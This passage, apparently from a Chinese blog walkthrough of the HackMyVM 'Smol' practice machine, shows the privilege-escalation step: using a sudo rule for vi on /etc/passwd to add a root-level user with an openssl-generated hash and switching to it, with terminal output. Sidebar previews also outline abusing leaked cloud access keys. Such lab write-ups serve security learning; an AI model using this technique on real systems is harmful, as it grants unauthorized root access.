<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gege@smol:~/wordpress.old$ su xavi</span><br><span class="line">Password: </span><br><span class="line">xavi@smol:/home/gege/wordpress.old$ whoami</span><br><span class="line">xavi</span><br><span class="line">xavi@smol:/home/gege/wordpress.old$ sudo -l</span><br><span class="line">[sudo] password for xavi: </span><br><span class="line">Matching Defaults entries for xavi on smol:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User xavi may run the following commands on smol:</span><br><span class="line">    (ALL : ALL) /usr/bin/vi /etc/passwd</span><br><span class="line">xavi@smol:/home/gege/wordpress.old$ </span><br></pre></td></tr></table></figure>

<p>可以编辑<code>/etc/passwd</code></p>
<p>执行<code>openssl passwd -1 -salt Yliken 123456</code>生成一段hasg</p>
<p>然后将其写入passwd</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503031810603.png" alt="image-20250303181029726"></p>
<p>然后<code>su Yliken</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xavi@smol:/home/gege/wordpress.old$ su Yliken</span><br><span class="line">Password: </span><br><span class="line">root@smol:/home/gege/wordpress.old$ whoami</span><br><span class="line">root</span><br><span class="line">root@smol:/home/gege/wordpress.old$ id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@smol:/home/gege/wordpress.old$ </span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Yliken</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/03/03/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-Smol/">http://example.com/2025/03/03/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-Smol/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Yliken</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/hackmyvm/">hackmyvm</a></div><div class="post-share"><div class="social-share" data-image="/img/essayhead/50.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/essayhead/as.jpg" target="_blank"><img class="post-qr-code-img" src="/img/essayhead/as.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/essayhead/as.jpg" target="_blank"><img class="post-qr-code-img" src="/img/essayhead/as.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/02/27/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-hero/" title="hackmyvm-hero"><img class="cover" src="/img/essayhead/72.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">hackmyvm-hero</div></div><div class="info-2"><div class="info-item-1">信息收集12345678910┌──(root㉿kali)-[/home/kali/Desktop/hackmyvm]└─# arp-scan -I eth1 192.168.56.0/24Interface: eth1, type: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.56.1    0a:00:27:00:00:0e       (Unknown: locally administered)192.168.56.100  08:00:27:43:9b:54       PCS Systemtechnik GmbH192.168.56.108  08:00:27:b9:ee:14       PCS Systemtechnik GmbH3 packets received by filter, 0 packets dropped by...</div></div></div></a><a class="pagination-related" href="/2025/03/06/%E4%BA%91/%E4%BA%91%E5%AE%89%E5%85%A8AKSK%E9%9A%8F%E7%AC%94/" title="云安全AKSK随笔"><img class="cover" src="/img/essayhead/64.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">云安全AKSK随笔</div></div><div class="info-2"><div class="info-item-1">AliYyun给出的AKSK的作用  在阿里云，用户可以使用AccessKey（简称AK）构造一个API请求（或者使用云服务SDK）来操作资源。AccessKey包括AccessKey ID和AccessKey Secret。其中AccessKey ID用于标识用户，AccessKey Secret是用来验证用户身份合法性的密钥。AccessKey Secret必须保密。  AK&#x2F;SK泄露的攻击面1.AK&#x2F;SK接管存储桶 当泄露的AK&#x2F;SK有对存储桶有操作权限的时候，可以在aliyun Cli配置AK&#x2F;SK来接管存储桶 使用aliyun oss ls来列出桶  使用aliyun oss ls &lt;桶的名称&gt;列出桶里面的内容   2.AK&#x2F;SK执行云服务器命令 当泄露的AK/SK对ECS有操作权限的时候 可以使用aliyun ecs DescribeInstances列出ECS资源  使用 aliyun ecs RunCommand --CommandContent &quot;&lt;命令内容&gt;&quot;...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/03/18/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-Espo/" title="hackmyvm-Espo"><img class="cover" src="/img/essayhead/32.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-18</div><div class="info-item-2">hackmyvm-Espo</div></div><div class="info-2"><div class="info-item-1">靶机地址 信息收集主机发现 123456789101112┌──(root㉿kali)-[/home/kali]└─# arp-scan -I eth1 192.168.56.0/24                                                          Interface: eth1, type: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission deniedWARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission deniedStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.56.1    0a:00:27:00:00:0e       (Unknown:...</div></div></div></a><a class="pagination-related" href="/2025/03/15/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-HackingToys/" title="hackmyvm-HackingToys"><img class="cover" src="/img/essayhead/92.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-15</div><div class="info-item-2">hackmyvm-HackingToys</div></div><div class="info-2"><div class="info-item-1">信息收集主机发现 123456789101112┌──(root㉿kali)-[/home/kali]└─# arp-scan -I eth1 192.168.56.0/24Interface: eth1, type: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission deniedWARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission deniedStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.56.1    0a:00:27:00:00:0e       (Unknown: locally administered)192.168.56.100  08:00:27:92:d2:b1      ...</div></div></div></a><a class="pagination-related" href="/2025/04/04/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-Principle/" title="hackmyvm-Principle"><img class="cover" src="/img/essayhead/18.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-04</div><div class="info-item-2">hackmyvm-Principle</div></div><div class="info-2"><div class="info-item-1"> 近况: 很难受、 也很累。 但是庆幸靶机很好 正值清明时节 清明时节雨纷纷 🌧️，路上行人欲断魂 😢。  靶机地址 信息收集主机发现  端口扫描  80端口仅仅是一个nginx 的欢迎界面而已  robots.txt的内容  hi.html的内容  hackme不存在  investigate的内容  根据提示对这个目录进行目录扫描   12345678910111213According to the Old Testament, the rainbow was created by God after the universal Flood. In the biblical account, it would appear as a sign of the divine will and to remind men of the promise made by God himself to Noah that he would never again destroy the earth with a flood.Maybe that&#x27;s why I am a...</div></div></div></a><a class="pagination-related" href="/2025/02/24/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-buster/" title="hackmyvm-buster"><img class="cover" src="/img/essayhead/83.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-24</div><div class="info-item-2">hackmyvm-buster</div></div><div class="info-2"><div class="info-item-1">题目地址 信息收集主机发现 123456789101112┌──(root㉿kali)-[/home/kali]└─# arp-scan -I eth1 192.168.56.0/24Interface: eth1, type: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission deniedWARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission deniedStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.56.1    0a:00:27:00:00:0e       (Unknown: locally administered)192.168.56.100  08:00:27:b0:9b:6b      ...</div></div></div></a><a class="pagination-related" href="/2025/02/27/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-hero/" title="hackmyvm-hero"><img class="cover" src="/img/essayhead/72.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-27</div><div class="info-item-2">hackmyvm-hero</div></div><div class="info-2"><div class="info-item-1">信息收集12345678910┌──(root㉿kali)-[/home/kali/Desktop/hackmyvm]└─# arp-scan -I eth1 192.168.56.0/24Interface: eth1, type: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.56.1    0a:00:27:00:00:0e       (Unknown: locally administered)192.168.56.100  08:00:27:43:9b:54       PCS Systemtechnik GmbH192.168.56.108  08:00:27:b9:ee:14       PCS Systemtechnik GmbH3 packets received by filter, 0 packets dropped by...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="artalk-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/essayhead/second.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Yliken</div><div class="author-info-description">红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">28</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Yliken"><i class="fab fa-github"></i><span>Github</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Yliken" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:largetlafonu71@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">他说你任何为人称道的美丽  不及他第一次遇到你</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">提权</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/09/09/CVE/%E5%85%B3%E4%BA%8E%20CVE-2025-53547%E7%9A%84%E6%80%9D%E8%80%83/" title="CVE-2025-53547：Helm依赖更新代码注入漏洞分析及深度思考"><img src="/img/essayhead/53.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2025-53547：Helm依赖更新代码注入漏洞分析及深度思考"/></a><div class="content"><a class="title" href="/2025/09/09/CVE/%E5%85%B3%E4%BA%8E%20CVE-2025-53547%E7%9A%84%E6%80%9D%E8%80%83/" title="CVE-2025-53547：Helm依赖更新代码注入漏洞分析及深度思考">CVE-2025-53547：Helm依赖更新代码注入漏洞分析及深度思考</a><time datetime="2025-09-08T16:00:00.000Z" title="发表于 2025-09-09 00:00:00">2025-09-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/05/pwn/learn%20Pwn/" title="Learn Pwn"><img src="/img/essayhead/34.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Learn Pwn"/></a><div class="content"><a class="title" href="/2025/08/05/pwn/learn%20Pwn/" title="Learn Pwn">Learn Pwn</a><time datetime="2025-08-04T16:00:00.000Z" title="发表于 2025-08-05 00:00:00">2025-08-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/03/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-Motto/" title="mazesec-Motto"><img src="/img/essayhead/83.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="mazesec-Motto"/></a><div class="content"><a class="title" href="/2025/08/03/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-Motto/" title="mazesec-Motto">mazesec-Motto</a><time datetime="2025-08-02T16:00:00.000Z" title="发表于 2025-08-03 00:00:00">2025-08-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/30/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-Temp/" title="mazesec-Temp"><img src="/img/essayhead/39.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="mazesec-Temp"/></a><div class="content"><a class="title" href="/2025/07/30/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-Temp/" title="mazesec-Temp">mazesec-Temp</a><time datetime="2025-07-29T16:00:00.000Z" title="发表于 2025-07-30 00:00:00">2025-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/28/CVE/cve-2024-39930/" title="CVE-2024-39930复现"><img src="/img/essayhead/8.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2024-39930复现"/></a><div class="content"><a class="title" href="/2025/07/28/CVE/cve-2024-39930/" title="CVE-2024-39930复现">CVE-2024-39930复现</a><time datetime="2025-07-27T16:00:00.000Z" title="发表于 2025-07-28 00:00:00">2025-07-28</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By Yliken</div><div class="footer_custom_text">层楼终究误少年 自由早晚乱余生</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  let artalkItem = null
  const option = null
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'

  const destroyArtalk = () => {
    if (artalkItem) {
      artalkItem.destroy()
      artalkItem = null
    }
  }

  const artalkChangeMode = theme => artalkItem && artalkItem.setDarkMode(theme === 'dark')

  const initArtalk = (el = document, pageKey = location.pathname) => {
    artalkItem = Artalk.init({
      el: el.querySelector('#artalk-wrap'),
      server: 'https://www.yliken.top/',
      site: 'Yliken 的博客',
      darkMode: document.documentElement.getAttribute('data-theme') === 'dark',
      ...option,
      pageKey: isShuoshuo ? pageKey : (option && option.pageKey) || pageKey
    })

    if (GLOBAL_CONFIG.lightbox === 'null') return
    artalkItem.on('list-loaded', () => {
      artalkItem.ctx.get('list').getCommentNodes().forEach(comment => {
        const $content = comment.getRender().$content
        btf.loadLightbox($content.querySelectorAll('img:not([atk-emoticon])'))
      })
    })

    if (isShuoshuo) {
      window.shuoshuoComment.destroyArtalk = () => {
        destroyArtalk()
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }

    btf.addGlobalFn('pjaxSendOnce', destroyArtalk, 'destroyArtalk')
    btf.addGlobalFn('themeChange', artalkChangeMode, 'artalk')
  }

  const loadArtalk = async (el, pageKey) => {
    if (typeof Artalk === 'object') initArtalk(el, pageKey)
    else {
      await btf.getCSS('https://cdn.jsdelivr.net/npm/artalk/dist/Artalk.min.css')
      await btf.getScript('https://cdn.jsdelivr.net/npm/artalk/dist/Artalk.min.js')
      initArtalk(el, pageKey)
    }
  }

  if (isShuoshuo) {
    'Artalk' === 'Artalk'
      ? window.shuoshuoComment = { loadComment: loadArtalk }
      : window.loadOtherComment = loadArtalk
    return
  }

  if ('Artalk' === 'Artalk' || !false) {
    if (false) btf.loadComment(document.getElementById('artalk-wrap'), loadArtalk)
    else setTimeout(loadArtalk, 100)
  } else {
    window.loadOtherComment = loadArtalk
  }
})()</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>